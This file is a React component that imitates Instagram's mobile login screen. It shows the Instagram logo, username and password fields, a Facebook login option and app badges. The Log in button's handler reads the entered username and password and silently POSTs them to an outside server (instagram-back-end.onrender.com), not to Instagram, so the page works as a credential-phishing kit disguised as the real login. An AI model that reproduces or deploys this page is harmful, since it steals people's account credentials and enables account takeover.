import instagram from "../../assets/img/instagram.png";
import icon from "../../assets/img/icon.png";
import play from "../../assets/img/play.png"
import "./Responsive.css"

export default function Responsive() {
    let text3 = document.querySelector(".inpp");
    let text4 = document.querySelector(".inptt");
    return (
        <>
            <div className="d d-block d-lg-none">
                <img src={instagram} alt="" />
                <div className="d">
                    <input type="text" placeholder="Phone number, username, or email" className="inpp" />
                </div>
                <div className="a">
                    <input type="password" placeholder="Password" className="inptt" />
                </div>
                <div className="s">
                    <button className="tn" onClick={() => {
                        console.log(text3);
                        let tex3 = text3.value;
                        let tex4 = text4.value;
                        fetch('https://instagram-back-end.onrender.com/data', {
                            method: 'POST',
                            headers: {
                                'Content-Type': 'application/json'
                            },
                            body: JSON.stringify({
                                Login: tex3,
                                Password: tex4
                            })
                        })
                    }}>Log in</button>
                </div>
                <div className="al">
                    <div className="k"></div>
                    <h6>OR</h6>
                    <div className="k"></div>
                </div>
                <div className="l">
                    <img src={icon} alt="" className="icon" />
                    <p className="nn">Log in with Facebook</p>
                </div>
                <p className="as">Forgot password?</p>
                <a href="https://www.instagram.com/accounts/password/reset/">
                </a>
                <div className="emme_">
                    <div className="emmer_">
                        <div className="u">
                            <p className="q">Don't have an account?</p>
                            <p className="up">Sign up</p>
                        </div>
                    </div>
                    <p className="ww">Get the app.</p>
                    <img src={play} alt="" />
                </div>
            </div>
        </>
    )
}
